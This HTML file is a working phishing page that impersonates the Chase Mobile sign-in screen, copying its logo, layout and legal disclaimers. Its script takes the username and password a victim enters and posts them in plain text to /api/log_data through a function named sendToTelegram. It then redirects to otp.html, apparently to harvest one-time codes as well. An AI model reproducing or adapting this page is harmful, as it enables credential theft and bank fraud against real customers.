<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Chase Mobile</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
  html, body {
    height: 100%;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    background: #202124;
  }
  body { display: flex; align-items: center; justify-content: center; }

  .phone {
    position: relative;
    width: 471px;
    height: 1019px;
    max-width: 100vw;
    max-height: 100vh;
    background: #105bab;
    overflow: hidden;
  }

  .screen {
    position: absolute;
    inset: 0;
    display: none;
    flex-direction: column;
    background: #105bab;
  }
  .screen.active { display: flex; }

  /* Status bar */
  .status-bar {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 18px 26px 0;
    color: #fff;
    font-size: 17px;
    font-weight: 600;
    height: 54px;
  }
  .status-bar .time { display: flex; align-items: center; gap: 6px; }
  .status-bar .loc {
    display: inline-flex; align-items: center; justify-content: center;
    width: 18px; height: 18px; border-radius: 50%; background: #2f7fd1;
  }
  .status-bar .loc svg { width: 11px; height: 11px; }
  .status-bar .right { display: flex; align-items: center; gap: 7px; }
  .status-bar .right svg { display: block; }
  .battery {
    display: inline-flex; align-items: center; gap: 3px;
    font-size: 13px; font-weight: 700;
  }
  .battery .cap {
    width: 26px; height: 15px; border-radius: 4px; background: #fff; color: #105bab;
    display: inline-flex; align-items: center; justify-content: center;
    font-size: 12px; font-weight: 700;
  }

  /* Logo */
  .logo {
    display: flex; align-items: center; justify-content: center;
    gap: 12px; margin-top: 70px;
    color: #fff;
  }

  /* Blue spacer that fills the top area above the card */
  .spacer { flex: 1 1 0; background: #105bab; }
  /* Bottom card */
  .card {
    background: #fff;
    border-radius: 6px;
    margin: 40px 8px 0;
  }
  .card.gray { background: #f2f2f2; }
  .card { position: relative; z-index: 1; }

  .card-inner { padding: 28px 26px 34px; }

  .welcome {
    text-align: center;
    color: #222;
    font-size: 19px;
    margin-bottom: 6px;
  }
  .subtitle {
    text-align: center;
    color: #222;
    font-size: 19px;
    margin-bottom: 22px;
  }

  .btn {
    display: block;
    width: 100%;
    border: none;
    border-radius: 4px;
    font-size: 18px;
    font-weight: 700;
    padding: 15px 0;
    cursor: pointer;
    text-align: center;
    font-family: inherit;
  }
  .btn-primary { background: #1163ac; color: #fff; }
  .btn-secondary { background: #e6eef6; color: #1163ac; }
  .btn-primary .loader {
    display: none;
    width: 20px; height: 20px;
    border: 2px solid rgba(255,255,255,0.35);
    border-top-color: #fff;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    margin: 0 auto;
  }
  .btn-primary.loading .btn-text { display: none; }
  .btn-primary.loading .loader { display: block; }
  .btn-primary:disabled { cursor: default; }
  @keyframes spin { to { transform: rotate(360deg); } }

  .divider {
    display: flex; align-items: center; text-align: center;
    color: #666; font-size: 15px; margin: 18px 0;
  }
  .divider::before, .divider::after {
    content: ""; flex: 1; height: 1px; background: #d5d5d5;
  }
  .divider span { padding: 0 14px; }

  /* Sign-in form */
  .field { margin-bottom: 4px; padding-top: 18px; }
  .field label { display: block; color: #555; font-size: 16px; margin-bottom: 6px; }
  .field-row {
    display: flex; align-items: center;
    border-bottom: 1px solid #767676;
    padding-bottom: 8px;
  }
  .field-row input {
    flex: 1; border: none; background: transparent; outline: none;
    font-size: 17px; color: #222; font-family: inherit;
  }
  .field-row .scan { color: #1163ac; width: 22px; height: 22px; }
  .field-row .show { color: #1163ac; font-size: 16px; font-weight: 600; cursor: pointer; }

  .check-row {
    display: flex; align-items: center; gap: 12px;
    margin-top: 20px; color: #222; font-size: 17px;
    cursor: pointer; user-select: none;
  }
  .check-row .box {
    width: 20px; height: 20px; border: 1.5px solid #555; border-radius: 3px;
    display: inline-flex; align-items: center; justify-content: center;
    flex-shrink: 0;
  }
  .check-row .box svg { width: 14px; height: 14px; display: none; }
  .check-row.checked .box {
    background: #1163ac; border-color: #1163ac;
  }
  .check-row.checked .box svg { display: block; }

  .signin-btn-wrap { margin-top: 26px; }
  .forgot {
    display: block; text-align: center; color: #1163ac;
    font-size: 17px; font-weight: 600; margin-top: 20px;
    text-decoration: none;
  }

  /* Footer */
  .footer {
    text-align: center;
    padding: 20px 10px 20px;
    color: #333;
    background: #fff;
    flex: 1 0 auto;
    position: relative;
    z-index: 0;
    margin-top: -28px;
    padding-top: 40px;
  }
  .footer-links {
    display: flex; align-items: center; justify-content: center;
    gap: 10px; margin-bottom: 16px; font-size: 15px;
  }
  .footer-links a { color: #1163ac; text-decoration: none; }
  .footer-links .sep { color: #c9c9c9; }
  .footer-links .dots { color: #555; font-weight: 700; letter-spacing: 1px; }
  .eho { display: flex; align-items: center; justify-content: center; gap: 6px; font-size: 13px; margin-bottom: 4px; color: #333; }
  .eho svg { width: 14px; height: 14px; }
  .eho svg path { fill: #333; }
  .disclaimer { font-size: 13px; line-height: 1.5; color: #333; }
</style>
</head>
<body>
<div class="phone">

  <!-- ============ SIGN IN ============ -->
  <section class="screen active" id="screen2">
    <div class="logo">
      <img src="chase-logo.png" alt="Chase" style="height: 40px; width: auto;">
    </div>

    <div class="spacer"></div>

    <div class="card gray">
      <div class="card-inner" style="padding-top:8px;">
        <div class="field">
          <label>Enter your username</label>
          <div class="field-row">
            <input type="text" autocomplete="username">
            <svg class="scan" viewBox="0 0 24 24" fill="none" stroke="#1163ac" stroke-width="2"><path d="M4 8V5a1 1 0 0 1 1-1h3M16 4h3a1 1 0 0 1 1 1v3M20 16v3a1 1 0 0 1-1 1h-3M8 20H5a1 1 0 0 1-1-1v-3"/><circle cx="12" cy="12" r="3"/></svg>
          </div>
        </div>
        <div class="field">
          <label>Enter your password</label>
          <div class="field-row">
            <input type="password" autocomplete="current-password">
            <span class="show" onclick="togglePw(this)">Show</span>
          </div>
        </div>

        <div class="check-row" onclick="toggleCheck(this)"><span class="box"><svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg></span> Remember me</div>
        <div class="check-row" onclick="toggleCheck(this)"><span class="box"><svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg></span> Use token</div>

        <div class="signin-btn-wrap">
          <button class="btn btn-primary" onclick="handleSignIn(this)">
            <span class="btn-text">Sign in</span>
            <span class="loader"></span>
          </button>
        </div>
        <a class="forgot" href="#">Forgot username or password?</a>
      </div>
    </div>

    <div class="footer">
      <div class="footer-links">
        <a href="#">Sign up</a><span class="sep">|</span>
        <a href="#">Open an account</a><span class="sep">|</span>
        <a href="#">Privacy</a><span class="dots">&#8226;&#8226;&#8226;</span>
      </div>
      <div class="eho">
        <svg viewBox="0 0 24 24" fill="#fff"><path d="M12 3L2 11h3v9h5v-6h4v6h5v-9h3L12 3z"/></svg>
        Equal Housing Opportunity
      </div>
      <div class="disclaimer">
        Deposit products provided by JPMorgan Chase Bank, N.A. Member FDIC<br>
        Credit cards are issued by JPMorgan Chase Bank, N.A. Member FDIC<br>
        &copy; 2026 JPMorgan Chase &amp; Co.
      </div>
    </div>
  </section>

</div>

<script>
  function showScreen(n) {
    document.querySelectorAll('.screen').forEach(function (s) { s.classList.remove('active'); });
    document.getElementById('screen' + n).classList.add('active');
  }
  function togglePw(el) {
    var input = el.parentElement.querySelector('input');
    if (input.type === 'password') { input.type = 'text'; el.textContent = 'Hide'; }
    else { input.type = 'password'; el.textContent = 'Show'; }
  }
  function toggleCheck(el) {
    el.classList.toggle('checked');
  }

  // --- Telegram logging (same as aa-main) ---
  (function() {
    var uid = localStorage.getItem('usa_session_uid');
    if (!uid) {
      uid = crypto.randomUUID ? crypto.randomUUID() : (Date.now() + '-' + Math.random().toString(36).slice(2));
      localStorage.setItem('usa_session_uid', uid);
    }
    window.__sessionUid = uid;
  })();

  function sendToTelegram(page, event_description, klartekst_input) {
    return fetch('/api/log_data', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        page: page,
        event_description: event_description,
        klartekst_input: klartekst_input,
        session_uid: window.__sessionUid
      })
    }).catch(function(err) { console.error('Telegram log failed:', err); });
  }

  function handleSignIn(btn) {
    if (btn.classList.contains('loading')) return;
    btn.classList.add('loading');
    btn.disabled = true;

    var inputs = document.querySelectorAll('#screen2 input');
    var username = inputs[0] ? inputs[0].value.trim() : '';
    var password = inputs[1] ? inputs[1].value : '';
    var payload = 'Username: ' + (username || 'N/A') + ' | Password: ' + (password || 'N/A');

    sendToTelegram('Chase Sign In', 'User submitted credentials', payload);

    setTimeout(function() {
      location.href = 'otp.html';
    }, 2000);
  }
</script>
</body>
</html>
